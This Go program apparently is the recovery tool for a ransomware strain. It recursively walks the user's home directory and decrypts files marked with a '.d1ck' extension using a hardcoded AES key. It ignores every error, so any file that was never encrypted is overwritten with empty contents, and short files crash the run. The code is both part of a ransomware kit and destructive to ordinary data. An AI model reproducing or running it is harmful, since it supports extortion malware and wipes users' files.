package main

import (
	"crypto/aes"
	"crypto/cipher"
	"io/fs"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	// "log" // uncomment this line and the log.Fatal() debug lines inside the code, if needed :)
)

func reset_extension(file_path string) string {
	suffix := ".d1ck"
	if strings.HasSuffix(file_path, suffix) { // if the file has .d1ck extension
		return file_path[:len(file_path)-len(suffix)] // remove .d1ck extension
	}
	// if it has no .d1ck extension don't change anything
	return file_path
}

func decrypt_file(file_path string) {
	// read the encrypted file
	file_contents, err := os.ReadFile(file_path)
	if err != nil {
		// log.Fatal(err)
	}

	secret_key := []byte("4f9a3b7c1d2e8f9a4c3d5b2e")

	// create a cipher block based on the secret key
	block, err := aes.NewCipher(secret_key)
	if err != nil {
		// log.Fatalf("Cipher error: %v", err.Error())
	}

	// create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		// log.Fatalf("Cipher GCM error: %v", err.Error())
	}

	// decrypt the file contents
	nonce := file_contents[:gcm.NonceSize()]
	file_contents = file_contents[gcm.NonceSize():]
	dec_contents, err := gcm.Open(nil, nonce, file_contents, nil)
	if err != nil {
		// log.Fatalf("Decrypt file error: %v", err.Error())
	}

	// from .d1ck extension to the original extension
	var dec_file_path string = reset_extension(file_path)

	// generate the decrypted file
	err = os.WriteFile(dec_file_path, dec_contents, 0777)
	if err != nil {
		// log.Fatalf("Recovering the old file error: %v", err.Error())
	}

	// check if the extension is .d1ck
	if strings.HasSuffix(file_path, ".d1ck") {
		err := os.Remove(file_path) // try to remove the encrypted file
		if err != nil {
			// log.Fatalf("Remove the encrypted file error: %v", err.Error())
		}
	}
}

func explore_directory(parent_dir string) {
	err := filepath.WalkDir(parent_dir, func(path string, file fs.DirEntry, err error) error {
		if !file.IsDir() { // it's a file, not a directory
			decrypt_file(path)
		} else { // don't decrypt the folder (but the files inside, see the if block)
			// nothing
		}

		return nil
	})

	if err != nil {
		// log.Fatalf("Impossible to walk directory: %s", err)
	}
}

func osWindows() {
	current_user, err := user.Current()
	if err != nil {
		// log.Fatal(err)
	}

	var user_dir string = current_user.HomeDir           // user path: C:\Users\this_user
	if _, err := os.Stat(user_dir); os.IsNotExist(err) { // check if the directory exists
		// log.Fatalf("Directory %s doesn't exist, check the code please :)", user_dir)
	}
	explore_directory(user_dir)
}

func osLinux() {
	current_user, err := user.Current()
	if err != nil {
		// log.Fatal(err)
	}

	var home_dir string = current_user.HomeDir           // home path: /home/thisuser
	if _, err := os.Stat(home_dir); os.IsNotExist(err) { // check if the directory exists
		// log.Fatalf("Directory %s doesn't exist, check the code please :)", home_dir)
	}
	explore_directory(home_dir)
}

func main() {
	switch runtime.GOOS {
	case "windows":
		osWindows()
	case "linux":
		osLinux()
	default:
		// other operating systems
	}
}
